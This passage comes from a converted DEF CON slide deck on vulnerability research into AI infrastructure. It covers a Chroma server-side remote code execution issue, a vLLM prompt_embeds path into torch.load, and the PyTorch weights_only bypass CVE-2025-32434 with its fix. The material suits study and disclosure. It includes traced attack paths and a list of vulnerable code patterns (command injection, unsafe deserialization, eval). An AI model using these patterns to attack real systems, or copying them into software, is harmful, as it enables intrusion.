---
title: "One Chain to Own Them All - Breaking AI Infrastructures"
speakers: ["Ji'an Zhou", "Lei Lu"]
conference: "DEF CON"
conference_full: "DEF CON 34"
edition: "34"
year: 2026
source_pdf: "DEF CON 34/DEF CON 34 - Ji'an Zhou, Lei Lu - One Chain to Own Them All - Breaking AI Infrastructures - azraelxuemo v3.pdf"
pages: 143
sha256: "0ab97ef76707c58a515d9ea2732e5cb33e69a9f9585016d390fb98cec1def43c"
text_chars: 123428
ocr_pages: 115
has_ocr: true
redacted_secrets: 0
ocr_confidence: 87.8
ocr_unreliable_blocks: 9
content_note: "91 of 143 pages were rendered and read against the source PDF by a vision model; 87 were rewritten. PAGES 66-91 AND 118-143 WERE NOT REVIEWED: four batches were stopped by the model API's cyber safeguards, which trigger on this deck's subject rather than on any individual page. Those 52 pages remain first-pass extraction and are not verified."
vision_verified_pages_changed: 25
vision_verified_pages: 91
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T06:39:35Z"
---
# One Chain to Own Them All - Breaking AI Infrastructures

**Speakers:** Ji'an Zhou, Lei Lu  
**Conference:** DEF CON 34  
**Source:** `DEF CON 34/DEF CON 34 - Ji'an Zhou, Lei Lu - One Chain to Own Them All - Breaking AI Infrastructures - azraelxuemo v3.pdf` (143 pages)


## Slide 1

2026

### One Chain to Own Them All

Breaking AI Infrastructures

Ji'an Zhou

1

## Slide 2

### Agenda

CONTENTS

- 01 Introduction
- 02 Journey Begins
- 03 Pwn it!
- 04 One Chain, All Owned
- 05 Summary

2

## Slide 3

### PART 01

Introduction

3

## Slide 4

### **LLM!**

**LARGE LANGUAGE MODEL**

*Illustration: a brain labelled "AI" wired with circuit traces to empty rounded call-out boxes; the small square nodes are labelled "T" and "C" on the left, "A" on the right, and "..." at the bottom.*

4

## Slide 5

### **Evolution: LLM → RAG → Agent**

*Hand-drawn diagram of three pipelines:*

**LLM**: prompt → LLM → answer

**RAG**: (database) + context → LLM → answer

**AGENT**: (database) memory → LLM, with a brain icon and a scissors icon labelled tools looping back into the LLM

5

## Slide 6

### **AI + Security**

**AI for security**

AI is the tool

Detect threats

Respond faster

Find vulnerabilities

*↔ reinforce each other*

**Security for AI**

AI is the subject

Protect the model

Control access

Prevent misuse

6

## Slide 7

### **AI For Security**

**16:35 – 17:00** AI Found 12 Zero-Days In OpenSSL. What Does It Mean For The Industry?

**Adam Krivka**, AI Security Reseatcher, AISLE

**Ondrej Vlcek**, Co-founder & CEO, AISLE

**13:55 – 14:20** FENRIR: AI Hunting for AI Zero-Days at Scale

**Peter Girnus**, Senior Threat Researcher, TrendAI

**Derek Chen**, Vulnerability Researcher, TrendAI

**11:35 – 12:00** AI Agents for Exploiting “Auth-by-One” Errors

**Brendan Dolan-Gavitt**, AI Researcher, XBOW

**Vincent Olesen**, AI Researcher, XBOW

**10:55 – 11:20** Promp2Pwn – LLMs Winning at Pwn2Own

**Georgi G**, Director of Research, Interrupt Labs

**11:20 – 11:45** Source to Sink: How to Improve LLM First-Party Vuln Discovery

**Scott Behrens**, Principal Security Engineer, Netflix

**Justice Cassel**, Application & GenAI Security, Netflix

https://unpromptedcon.org/

7

## Slide 8

### **Security For AI**

**Agentic Browser Security: 2025 Year-End Review**  
Rami McCarthy  
January 17, 2026

**Hacking Moltbook: The AI Social Network Any Human Can Control**  
Gal Nagli  
February 2, 2026

**Context.ai OAuth Token Compromise**  
Merav Bar, Hila Ramati, Maayan Bentor  
April 21, 2026

**How Wiz found a Critical NVIDIA AI vulnerability: Deep Dive into a container escape (CVE-2024-0132)**  
Shir Tamari, Ronen Shustin, Andres Riancho  
February 12, 2025

**The risk in malicious AI models: Wiz Research discovers critical vulnerability in AI-as-a-Service provider, Replicate**  
Shir Tamari, Sagi Tzadik  
May 23, 2024

**MCP Auto-Execution: From Git Clone to Cloud Compromise in Amazon Q VS Code Extension**  
Maor Dokhanian  
June 26, 2026

*Card thumbnails carry the artwork captions: WIZ Research; MOLTBOOK; WIZ Threat Update! – Context.ai OAuth Token Compromise; WIZ Research – NVIDIA Vulnerability Details; WIZ / Replicate – WIZ Research; MCP – WIZ Research.*

https://www.wiz.io/blog/

8

## Slide 9

### **Security For AI**

**ANNOUNCING PWN2OWN BERLIN AND INTRODUCING AN AI CATEGORY**

February 24, 2025 | Dustin Childs

| Target | Prize | Master of Pwn Points |
| --- | --- | --- |
| Chroma | $20,000 | 2 |
| Postgres pgvector | $30,000 | 3 |
| Redis | $40,000 | 4 |
| Ollama | $20,000 | 2 |
| NVIDIA Triton Inference Server | $30,000 | 3 |
| NVIDIA Container Toolkit | $30,000 | 3 |

9

## Slide 10

😀 Start of our journey

10

## Slide 11

### PART 02

Journey Begins

11

## Slide 12

### **Classifying AI Targets**

**DATA & VECTOR STORAGE**

Chroma pgvector Redis

**MODEL INFERENCE & SERVING**

Ollama NVIDIA Triton Inference Server

**FOUNDATIONAL INFRASTRUCTURE**

NVIDIA Container Toolkit

12

## Slide 13

### **New Security Contest Hosted by Wiz**

**ZERODAY**  
**20 CLOUD 25**

– AI –

**Ollama**  
Runs consumer AI models in the cloud.  
**$40,000**

**vLLM**  
Powers fast LLM endpoints in the cloud.  
**$40,000**

**NVIDIA Container Toolkit**  
Enables GPU access for containerized cloud workloads.  
**$40,000**  
Container escape

13

## Slide 14

### **Summary of AI Targets & Categories**

**DATA & VECTOR STORAGE**

- Chroma
- pgvector
- Redis

**MODEL INFERENCE & SERVING**

- Ollama
- vLLM
- NVIDIA Triton Inference Server

**FOUNDATIONAL INFRASTRUCTURE**

- NVIDIA
- NVIDIA Container Toolkit

14

## Slide 15

### **Data & Vector Storage**

**DATA & VECTOR STORAGE**

- Chroma
- pgvector
- Redis

**MODEL INFERENCE & SERVING**

- Ollama
- vLLM
- NVIDIA Triton Inference Server

**FOUNDATIONAL INFRASTRUCTURE**

- NVIDIA
- NVIDIA Container Toolkit

*(Same three-panel diagram as the previous slide; the DATA & VECTOR STORAGE panel is emphasised and the Chroma logo/label is boxed in red, while the other two panels are greyed out.)*

15

## Slide 16

### **Architecture**

*Diagram in a window titled **Chroma**:*

- **Clients** --> **Gateways** --> **Distributed Log**
- **Gateways** --> **Query Nodes**
- **Distributed Log** --> **Compactor Nodes**
- **Query Nodes** --> (dashed line running right) --> **SysDb**
- **Compactor Nodes** --> **Storage**

16

## Slide 17

### **Written in Rust**

*(Chroma logo and wordmark, top right: **Chroma**)*

`chroma-core / chroma` — `Type / to search`

Code · Issues **260** · Pull requests **291** · Actions · Projects · Wiki · Security and quality · Insights

**Files** — branch `main` — `Go to file` (t)

File tree (`rust` expanded):

- api-types
- benchmark
- blockstore
- cache
- chroma
- cli
- config
- distance
- error
- frontend
- garbage_collector
- index
- jemalloc-pprof-server
- js-bindings *(row cut off at the bottom edge)*

`chroma / rust /`

tanujnay112 — [CHORE]: Create per-tenant config in the compactor for shard sizes (#… — 3676846 · [cut off]

| Name | Last commit message |
| --- | --- |
| .. | |
| api-types | [RELEASE] Rust client 0.13.3 (#6769) |
| benchmark | [CHORE]: Update google cloud spanner dependency + update rust version (… |
| blockstore | [ENH] Wire BloomFilter into RecordSegmentWriter (#6647) |
| cache | [ENH]: Code impl for Block with more efficient estimated_size() funct… |
| chroma | [ENH] Add getCollectionById API across all client SDKs and server (#6805 |
| cli | [RELEASE] CLI 1.4.3 Python 1.5.7 JS 3.4.3 (#6845) |
| config | [CHORE] Upgrade reqwest and spanner crates (#6705) |
| distance | [ENH] Cleanup a warning on AVX512+SSE where both are imported. (#5931) |
| error | [BUG](log-service,storage): classify transient errors for retry (#6731) |
| frontend | [ENH]: Merge, sort and truncate in FE (#6846) |

17

## Slide 18

### **Pwned?**

**TrendAI Zero Day Initiative** (verified) @thezdi · 2025年5月15日

Confirmed! The first ever winner of the AI category in **#Pwn2Own** is Sina Kheirkhah (@SinSinology) of Summoning Team (@SummoningTeam). His successful exploit of **Chroma** earns him $20,000 and 2 Master of Pwn points. #P2OBerlin

Attached graphic:

**SUCCESS**

**Sina Kheirkhah**

Summoning Team

**TARGETTING**

Chroma in the AI category

| PRIZE $ | POINTS |
| --- | --- |
| $20,000 | 2 |

*(Tweet engagement: 4 replies · 9 reposts · 84 likes · 1.1万 views)*

*(Top right: a reaction-meme photo of a smiling man, captioned "???")*

18

## Slide 19

### **My Discovery**

```python
@trace_method("FastAPI.create_collection", OpenTelemetryGranularity.OPERATION)
    async def create_collection(
        self,
        request: Request,
        tenant: str,
        database_name: str,
    ) -> CollectionModel:
        def process_create_collection(
            request: Request, tenant: str, database: str, raw_body: bytes
        ) -> CollectionModel:
            create = validate_model(CreateCollection, orjson.loads(raw_body))
            if not create.configuration:
                ...
            else:
                configuration = load_create_collection_configuration_from_json(
                    create.configuration
                )
```

*(Red box around the `configuration = load_create_collection_configuration_from_json(create.configuration)` lines; a red arrow points from there to the right-hand snippet below.)*

```python
def build_from_config(config: Dict[str, Any]) -> "EmbeddingFunction[Documents]":
    model_name = config.get("model_name")
    device = config.get("device")
    normalize_embeddings = config.get("normalize_embeddings")
    kwargs = config.get("kwargs", {})

    if model_name is None or device is None or normalize_embeddings is None:
        assert False, "This code should not be reached"

    return SentenceTransformerEmbeddingFunction(
        model_name=model_name,
        device=device,
        normalize_embeddings=normalize_embeddings,
        **kwargs,
    )
```

*(Red boxes around `kwargs = config.get("kwargs", {})` and around the whole `return SentenceTransformerEmbeddingFunction(...)` block.)*

```python
    if json_map.get("embedding_function") is not None:
        ef_config = json_map["embedding_function"]
        if ef_config["type"] == "legacy":
            warnings.warn(
                "legacy embedding function config",
                DeprecationWarning,
                stacklevel=2,
            )
        else:
            ef = known_embedding_functions[ef_config["name"]]
            result["embedding_function"] = ef.build_from_config(ef_config["config"])
```

*(Red box around the two lines under `else:`; a red arrow points from there down-left to the `build_from_config` snippet.)*

19

## Slide 20

### **My Discovery**

**[Vulnerability ]: Python Backend Server Side RCE & Python Client SDK RCE** #6717

`Open`

azraelxuemo opened on Mar 24 — Last edited by azraelxuemo

**Vulnerability 1, Python Backend Server Side RCE**

**Clarification**

Chroma has two server-side implementations: one in Python and the other in Rust. By default you will get a Rust Server, and this vulnerability only affect the Python Backend

**Detail**

First, the API Server of Chroma has an interface called create_collection.
And it will calls the load_create_collection_configuration_from_json function.
https://github.com/chroma-core/chroma/blob/main/chromadb/server/fastapi/__init__.py#L816

https://github.com/chroma-core/chroma/issues/6717

20

## Slide 21

### **Pwned Again!**

**TrendAI Zero Day Initiative** (verified) @thezdi · 5月14日

Confirmed! haehae (@haehaeYang) of Out Of Bounds chained 2 bugs (CWE-190, CWE-362) to exploit **Chroma**, earning $20,000 and 2 Master of Pwn points. Full win! **#Pwn2Own** #P2OBerlin

*(Photo: two laptops held up side by side; the left screen shows the Out of Bounds logo with the text "Out of Bounds" and "oobs.io".)*

*(Tweet engagement: 1 reply · 6 reposts · 76 likes · 9,241 views)*

21

## Slide 22

### **Choose vLLM – Written in Python**

**DATA & VECTOR STORAGE**

- Chroma
- pgvector
- Redis

**MODEL INFERENCE & SERVING**

- Ollama
- vLLM
- NVIDIA Triton Inference Server

**FOUNDATIONAL INFRASTRUCTURE**

- NVIDIA
- NVIDIA Container Toolkit

*(Same three-panel diagram; the MODEL INFERENCE & SERVING panel is emphasised and the vLLM logo is boxed in red, while the other two panels are greyed out.)*

22

## Slide 23

### **Latest Version Recap**

你已转帖

**Wiz** (verified) @wiz_io · 2025年10月1日

Introducing ZERODAY.CLOUD🥷
Be the first to participate in the first-of-its-kind cloud hacking competition. 🤝

WIN PRIZES from our 4.5M$ prize pool. 💰

Register your exploit > zeroday.cloud

@msftsecresponse @awscloud @googlecloud

*(Attached GIF card:)* **WIZ Research** — **ZERODAY CLOUD** (20 / 25) — "The first of its kind cloud hacking competition" — **- STARTING NOW! -** — GIF

*(Right: browser window)*

https://github.com/vllm-project/vllm/releases?page=2

Oct 3, 2025 — simon-mo — v0.11.0 — b8b302c — Compare

**v0.11.0**

**Highlights**

This release fea… *(cut off at the right edge)*

23

## Slide 24

### **Contest Environment Setup**

**zeroday-cloud-2025 / vllm / docker-compose.yaml**

nirohfeld  Added targets

Code | Blame — `25 lines (20 loc) · 520 Bytes`

```yaml
 1  services:
 2    vllm:
 3      image: vllm/vllm-openai:latest
 4      container_name: zerodaycloud-vllm
 5
 6      ports:
 7        - "8000:8000"
 8
 9      environment:
10        - HUGGING_FACE_HUB_TOKEN=${HUGGING_FACE_HUB_TOKEN:-}
11
12      deploy:
13        resources:
14          reservations:
15            devices:
16              - driver: nvidia
17                count: all
18                capabilities: [gpu]
19
20      command: >
21        --model ${MODEL:-facebook/opt-125m}
22        --host 0.0.0.0
23        --port 8000
24
25      restart: unless-stopped
```

24

## Slide 25

### **Supported APIs**

```text
[illegible]
(APIServer pid=1) INFO 04-14 21:50:39 [api_server.py:1912] Starting vLLM API server 0 on http://0.0.0.0:8000
(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:34] Available routes are:
(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /openapi.json, Methods: GET, HEAD
(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /docs, Methods: GET, HEAD
(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /docs/oauth2-redirect, Methods: GET, HEAD
(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /redoc, Methods: GET, HEAD
(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /health, Methods: GET
(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /load, Methods: GET
(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /ping, Methods: POST
(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /ping, Methods: GET
(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /tokenize, Methods: POST
(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /detokenize, Methods: POST
(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /v1/models, Methods: GET
(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /version, Methods: GET
(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /v1/responses, Methods: POST
(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /v1/responses/{response_id}, Methods: GET
(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /v1/responses/{response_id}/cancel, Methods: POST
(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /v1/chat/completions, Methods: POST
(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /v1/completions, Methods: POST
(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /v1/embeddings, Methods: POST
(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /pooling, Methods: POST
(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /classify, Methods: POST
(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /score, Methods: POST
(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /v1/score, Methods: POST
(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /v1/audio/transcriptions, Methods: POST
(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /v1/audio/translations, Methods: POST
(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /rerank, Methods: POST
(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /v1/rerank, Methods: POST
(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /v2/rerank, Methods: POST
(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /scale_elastic_ep, Methods: POST
(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /is_scaling_elastic_ep, Methods: POST
(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /invocations, Methods: POST
(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /metrics, Methods: GET
(APIServer pid=1) INFO:     Started server process [1]
(APIServer pid=1) INFO:     Waiting for application startup.
(APIServer pid=1) INFO:     Application startup complete.
```

*(A red box surrounds the right-hand portion of the log, from "Available routes are:" down to "Route: /metrics, Methods: GET".)*

25

## Slide 26

### **Simple Test**

```text
xuemo>
xuemo>curl http://localhost:8000/v1/completions   -H "Content-Type: application/json"   -d '{
    "model": "facebook/opt-125m",
    "prompt": "Hello, my name is",
    "max_tokens": 50
  }'
{"id":"cmpl-4331dffc745345bd87ea5d68ece4195c","object":"text_completion","created":1776233929,"model":"facebook/opt-125
m","choices":[{"index":0,"text":" Mica, i have a female b FieldTerrier that wants to go ahead and find her due. It is a
n all day Moonglow National Memorial and I am grateful for you.   How could she be so lonely....  No one","logprobs":nu
ll,"finish_reason":"length","stop_reason":null,"token_ids":null,"prompt_logprobs":null,"prompt_token_ids":null}],"servi
ce_tier":null,"system_fingerprint":null,"usage":{"prompt_tokens":6,"total_tokens":56,"completion_tokens":50,"prompt_tok
ens_details":null},"kv_transfer_params":null}xuemo>
```

*(Red boxes around the `"prompt": "Hello, my name is",` line and around the generated `"text"` of the response.)*

26

## Slide 27

### **Useless Endpoints**

```python
@router.get("/v1/models")
async def show_available_models(raw_request: Request):
    handler = models(raw_request)

    models_ = await handler.show_available_models()
    return JSONResponse(content=models_.model_dump())


@router.get("/version")
async def show_version():
    ver = {"version": VLLM_VERSION}
    return JSONResponse(content=ver)

@router.get("/ping", response_class=Response)
@router.post("/ping", response_class=Response)
async def ping(raw_request: Request) -> Response:
    """Ping check. Endpoint required for SageMaker"""
    return await health(raw_request)
```

27

## Slide 28

### **Common Vulnerability Patterns**

**! 1. Command Injection**

Execution of arbitrary OS commands via untrusted input.

```
Danger: os.system(f"ping {user_input}")
```

**! 2. SSTI**

Injection of malicious code into a template engine.

```
Danger: render_template_string(user_input)
```

**! 3. Insecure Deserialization**

Loading malicious serialized objects leading to RCE.

```
Danger: pickle.loads(user_input) | yaml.load()
```

**! 4. Dangerous Functions**

Dynamic execution of untrusted input code.

```
Danger: eval(user_input) | exec(user_input)
```

**! 5. Path Traversal**

Unauthorized read/write access to the file system.

```
Danger: open(f"/app/uploads/{user_input}")
```

**! 6. XML External Entity (XXE)**

Parsing XML with external entity resolution enabled.

```
Danger: xml.etree.ElementTree.parse(untrusted)
```

28

## Slide 29

### **Found A Potential Vulnerability?**

```python
@router.post("/tokenize",
async def tokenize(request: TokenizeRequest, raw_request: Request):
```

##### 🤑 SSTI?

```python
chat_template: Optional[str] = Field(
        default=None,
        description=(
            "A Jinja template to use for this conversion. "
            "As of transformers v4.44, default chat template is no longer "
            "allowed, so you must provide a chat template if the tokenizer "
            "does not define one."),
    )
```

```python
await self._preprocess_chat(
                    request,
                    tokenizer,
                    request.messages,
                    tool_dicts=tool_dicts,
                    chat_template=request.chat_template or self.chat_template,
                    chat_template_content_format=self.
                    chat_template_content_format,
                    add_generation_prompt=request.add_generation_prompt,
                    continue_final_message=request.continue_final_message,
                    chat_template_kwargs=request.chat_template_kwargs,
                    add_special_tokens=request.add_special_tokens,
                )
```

29

## Slide 30

### **False Positive**

##### 😶‍🌫️ Game Over

```python
jinja_env = ImmutableSandboxedEnvironment(
        trim_blocks=True, lstrip_blocks=True, extensions=[AssistantTracker, jinja2.ext.loopcontrols]
    )
    jinja_env.filters["tojson"] = tojson
    jinja_env.globals["raise_exception"] = raise_exception
    jinja_env.globals["strftime_now"] = strftime_now
    return jinja_env.from_string(chat_template)
```

```python
rendered_chat = compiled_template.render(
                messages=chat,
                tools=tool_schemas,
                documents=documents,
                add_generation_prompt=add_generation_prompt,
                **kwargs,
            )
```

30

## Slide 31

### BACK TO SLEEP

*Cartoon of two penguins lying wide awake in bed, tucked under a white duvet.*

31

## Slide 32

### **An Accidental Discovery**

```python
@router.post("/v1/completions",
async def create_completion(request: CompletionRequest, raw_request: Request):
    handler = completion(raw_request)
    generator = await handler.create_completion(request, raw_request)
```

```python
class CompletionRequest(OpenAIBaseModel):
    model: str | None = None

    ...
    prompt_embeds: bytes | list[bytes] | None = None
```

```text
POST /v1/completions { "prompt_embeds": "<base64>" }
 |
 |-- api_server.py:651            handler.create_completion(request, raw_request)
 |-- serving_completion.py:138  renderer.render_prompt_and_embeds(prompt_embeds=
                                                        request.prompt_embeds)
 |-- renderer.py:254              self.load_prompt_embeds(prompt_embeds)
 |-- renderer.py:148              torch.load(io.BytesIO(pybase64.b64decode(embed)),
                                                            weights_only=True)
```

32

## Slide 33

### **My Previous Finding**

##### 🤔 Can we succeed again?

**Critical**  **malfet** published **GHSA-53q9-r3pm-6pq6** on Apr 18, 2025

| Package | Affected versions | Patched versions |
| --- | --- | --- |
| pytorch (pip) | <=2.5.1 | 2.6.0 |

**Description**

### Description

I found a Remote Command Execution (RCE) vulnerability in PyTorch. When loading model using torch.load with weights_only=True, it can still achieve RCE.

### Background knowledge

https://github.com/pytorch/pytorch/security

As you can see, the PyTorch official documentation considers using `torch.load()` with `weights_only=True` to be safe.

> **Be mindful of risky model formats**. Give preference to share and load weights with the appropriate format for your use case. safetensors gives the most safety but is the most restricted in what it supports. `torch.load` with `weights_only=True` is also secure to our knowledge even though it offers significantly larger surface of attack. Loading un-trusted checkpoint with `weights_only=False` MUST never be done.

Since everyone knows that weights_only=False is unsafe, so they will use the weights_only=True to mitigate the seucirty issue.
But now, I just proved that even if you use weights_only=True, it can still achieve RCE.

### Credit

This vulnerability was found by Ji'an Zhou.

**Severity**

Critical

**CVE ID**

CVE-2025-32434

**Weaknesses**

No CWEs

**Credits**

azraelxuemo — Reporter

33

https://github.com/advisories/GHSA-53q9-r3pm-6pq6

## Slide 34

# PART 03

### Pwn it!

34

## Slide 35

### **What is PyTorch?**

*PyTorch logo: the orange flame mark and "PyTorch" wordmark on a dark banner.*

##### Most popular deep learning framework

35

## Slide 36

### **Model Save and Load Flow**

**Save pipeline**

- **Trained model weights** — `model.state_dict()`
- → **Serialize and save** — `torch.save(...)`
- → **checkpoint.pt** — Weights stored on disk

**Load pipeline**

- **Read checkpoint file** — `torch.load(...)`
- → **Load into model** — `model.load_state_dict(...)`
- → **Inference / Resume training** — `model.eval() or continue optimization`

36

## Slide 37

### **Early Stage**

- **Untrusted checkpoint** — `malicious_model.pt`
- → **PyTorch loading API** — `torch.load(...)`
- → **Python pickle layer** — `pickle.load(...)`
- → **💣 RCE**

37

## Slide 38

### **Introducing weights_only Mechanism**

**Add `weights_only` option to `torch.load` #86812**

**Closed** — **malfet** wants to merge 13 commits into `master` from `malfet/safer-unpickler`

Conversation 34 | Commits 13 | Checks 0 | Files changed 3

**malfet** commented on Oct 13, 2022 • edited — Contributor

This addresses the security issue in default Python's `unpickler` that allows arbitrary code execution while unpickling. Restrict classes allowed to be unpicked to in `None`, `int`, `bool`, `str`, `float`, `list`, `tuple`, `dict`/`OrderedDict` as well as `torch.Size`, `torch.nn.Param` as well as `torch.Tensor` and `torch.Storage` variants.

Defaults `weights_only` is set to `False`, but allows global override to safe only load via `TORCH_FORCE_WEIGHTS_ONLY_LOAD` environment variable.

To some extent, addresses #52596

38

https://github.com/pytorch/pytorch/pull/86812

## Slide 39

### **Official Security Statement**

**Be mindful of risky model formats**. Give preference to share and load weights with the appropriate format for your use case. safetensors gives the most safety but is the most restricted in what it supports. `torch.load` with `weights_only=True` is also secure to our knowledge even though it offers significantly larger surface of attack. Loading un-trusted checkpoint with `weights_only=False` MUST never be done.

39

https://github.com/pytorch/pytorch/blob/v2.5.1/SECURITY.md

## Slide 40

**AI INFRASTRUCTURE**

*Diagram: a bracket labelled "AI INFRASTRUCTURE" spans a drawing of a skyscraper; a curved arrow points from the label below up to the slab at the base of the building.*

**weights_only=True**

😎 **A bypass here would be massive**

40

## Slide 41

### **My Previous Finding**

##### CVE-2025-32434

*Screenshot of the GitHub security advisory:*

`Critical` — **malfet** published **GHSA-53q9-r3pm-6pq6** on Apr 18, 2025

| Package | Affected versions | Patched versions |
| --- | --- | --- |
| **pytorch** (pip) | <=2.5.1 | 2.6.0 |

**Description**

### Description

I found a Remote Command Execution (RCE) vulnerability in PyTorch. When loading model using torch.load with weights_only=True, it can still achieve RCE.

### Background knowledge

https://github.com/pytorch/pytorch/security

As you can see, the PyTorch official documentation considers using `torch.load()` with `weights_only=True` to be safe.

> **Be mindful of risky model formats.** Give preference to share and load weights with the appropriate format for your use case. safetensors gives the most safety but is the most restricted in what it supports. `torch.load` with `weights_only=True` is also secure to our knowledge even though it offers significantly larger surface of attack. Loading un-trusted checkpoint with `weights_only=False` MUST never be done.

Since everyone knows that weights_only=False is unsafe, so they will use the weights_only=True to mitigate the seucirty issue.
But now, I just proved that even if you use weights_only=True, it can still achieve RCE.

### Credit

This vulnerability was found by Ji'an Zhou.

*Right-hand side panel:*

| | |
| --- | --- |
| Severity | Critical |
| CVE ID | CVE-2025-32434 |
| Weaknesses | No CWEs |
| Credits | azraelxuemo — Reporter |

41

https://github.com/advisories/GHSA-53q9-r3pm-6pq6

## Slide 42

### **Attack Approach**

*Flowchart:*

- `torch.load(..., weights_only=True)` → **Is TorchScript format?**
  - **Yes** → `torch.jit.load(...)` ⇢ 🔍 **Find vulnerabilities in it**
  - **No** → `_weights_only_unpickler`

42

## Slide 43

### **Discovery Recap**

##### 🤩 With this bypass, we can achieve RCE in vLLM!

```
POST /v1/completions { "prompt_embeds": "<base64>" }
  │
  ├── api_server.py:651          handler.create_completion(request, raw_request)
  ├── serving_completion.py:138  renderer.render_prompt_and_embeds(prompt_embeds=
                                                                   request.prompt_embeds)
  ├── renderer.py:254            self.load_prompt_embeds(prompt_embeds)
  ├── renderer.py:148            torch.load(io.BytesIO(pybase64.b64decode(embed)),
                                                                       weights_only=True)
```

43

## Slide 44

### **Discovery Recap**

*Screenshot of the vLLM security advisory:*

**CVE-2025-24357 Malicious model remote code execution fix bypass with PyTorch < 2.6.0**

`High` — **russellb** published **GHSA-ggpf-24jw-3fcw** on Apr 23, 2025

| Package | Affected versions | Patched versions |
| --- | --- | --- |
| **vllm** (pip) | <0.8.0 | 0.8.0 |

**Description**

### Description

GHSA-rh4j-5rhw-hr54 reported a vulnerability where loading a malicious model could result in code execution on the vllm host. The fix applied to specify `weights_only=True` to calls to `torch.load()` did not solve the problem prior to PyTorch 2.6.0.

PyTorch has issued a new CVE about this problem: GHSA-53q9-r3pm-6pq6

This means that versions of vLLM using PyTorch before 2.6.0 are vulnerable to this problem.

### Background Knowledge

When users install VLLM according to the official manual

> **Getting Started**
>
> Install vLLM with `pip` or from source:
>
> ```
> pip install vllm
> ```

But the version of PyTorch is specified in the requirements. txt file

*(a GitHub file view — "vllm-project / vllm" — starts below and is cut off by the bottom of the slide)*

*Right-hand side panel:*

Severity: `High` 7.5 / 10

**CVSS v3 base metrics**

| | |
| --- | --- |
| Attack vector | Network |
| Attack complexity | High |
| Privileges required | None |
| User interaction | Required |
| Scope | Unchanged |
| Confidentiality | High |
| Integrity | High |
| Availability | High |

Learn more about base metrics

`CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H`

| | |
| --- | --- |
| CVE ID | CVE-2025-32434 |
| Weaknesses | No CWEs |
| Credits | azraelxuemo — Reporter<br>russellb — Coordinator |

44

https://github.com/vllm-project/vllm/security/advisories/GHSA-ggpf-24jw-3fcw

## Slide 45

### **Discovery Recap**

```python
def pt_weights_iterator(
    hf_weights_files: list[str],
    use_tqdm_on_load: bool,
    pt_load_map_location: str | dict[str, str] = "cpu",
) -> Generator[tuple[str, torch.Tensor], None, None]:
    """Iterate over the weights in the model bin/pt files."""
    for bin_file in tqdm(
        hf_weights_files,
        desc="Loading pt checkpoint shards",
        disable=not enable_tqdm(use_tqdm_on_load),
        bar_format=_BAR_FORMAT,
    ):
        state = torch.load(
            bin_file, map_location=pt_load_map_location, weights_only=True
        )
        yield from state.items()
        del state
```

45

## Slide 46

##### 🤩 With this bypass, we can achieve RCE in vLLM!

##### 😂 But they've already updated PyTorch to resolve the issue

**vllm** / **requirements** / **cuda.txt**

**huydhn** and **mgoin**  Update PyTorch to 2.8.0 (#20358)  ✕   `67c1…` *(commit hash cut off at the slide edge)*

Code | Blame — `14 lines (12 loc) · 714 Bytes`

```
# Common dependencies
-r common.txt

numba == 0.60.0; python_version == '3.9' # v0.61 doesn't support Python 3.9. Required for N-gram speculative decoding
numba == 0.61.2; python_version > '3.9'

# Dependencies for NVIDIA GPUs
ray[cgraph]>=2.48.0 # Ray Compiled Graph, required for pipeline parallelism in V1.
torch==2.8.0
```

46

## Slide 47

*Meme image (imgflip.com watermark): a man tapping his temple, captioned* **"Can we bypass again?"**

47

## Slide 48

### **The Fix**

*Side-by-side diff (left pane lines 1432–1440, right pane lines 1432–1445); the added block is highlighted green:*

```diff
             if _is_torchscript_zip(opened_zipfile):
                 warnings.warn(
                     "'torch.load' received a zip file that looks like a TorchScript archive"
                     " dispatching to 'torch.jit.load' (call 'torch.jit.load' directly to"
                     " silence this warning)",
                     UserWarning,
                 )
+                if weights_only:
+                    raise RuntimeError(
+                        "Cannot use ``weights_only=True`` with TorchScript archives passed to "
+                        "``torch.load``. " + UNSAFE_MESSAGE
+                    )
             opened_file.seek(orig_position)
             return torch.jit.load(opened_file,
```

*Flowchart:*

- `torch.load(..., weights_only=True)` → **Is TorchScript format?**
  - **Yes** ❌ → `torch.jit.load(...)`
  - **No** ✅ → `_weights_only_unpickler`

48

https://github.com/pytorch/pytorch/pull/143326/changes

## Slide 49

### **Strict Whitelist**

